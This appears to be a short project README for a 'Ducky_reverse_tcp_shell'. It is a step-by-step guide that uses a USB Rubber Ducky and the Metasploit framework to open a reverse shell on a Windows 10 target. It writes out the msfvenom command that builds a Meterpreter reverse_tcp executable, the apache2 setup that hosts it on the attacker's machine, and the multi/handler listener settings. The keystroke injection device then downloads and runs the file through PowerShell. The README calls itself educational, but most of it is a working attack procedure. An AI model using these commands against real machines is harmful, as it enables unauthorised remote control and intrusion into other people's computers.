# Ducky_reverse_tcp_shell
Uses the metasploit framework and the USB-RubberDucky to create a reverse- shell (without bypassing any AntiMalwareScanner -> not effective)

AttackerMachine: Kali Linux (2022.1)connected to the targets Network

TargetMachine: Windows 10 Home, Windows Defender: realtime monitoring off, admin privileges 


1. Create a payload to be executes on the target machine.

msfvenom: payload gnerator of the Metasploit framework

payload: windows/meterpreter/reverse_tcp

filetype: .exe (for windows)

Directory: /var/www/html/yourfile.exe 

--> sets the directory of the malicious file to the html directory of my machine. To Host this small server ill use apache2. 

Command: sudo service apache2 start

Command2: msfvenom -p windows/meterpreter/reverse_tcp LHOST your.ip.addr.ess LPORT 4444 -f exe -o /var/www/html/Yourfile.exe

2. Setup the listening Machine(Attacker)

msfconsole

msf6: use exploit/multi/handler

msf6: set payload windows/meterpreter/reverse_tcp

msf6: set LHOST and LPORT

msf6: exploit

3. Ducky Setup:

Encode and flash the DuckyCode file on the Ducky

insert the USB-RubberDucky

--> This payload downloads and executes the hosted .exe file via Powershell. Any AntiMalware Software will recognize this so its jsut a educational project -> Meterpreter session should open in the msfconsole 

Mission complete
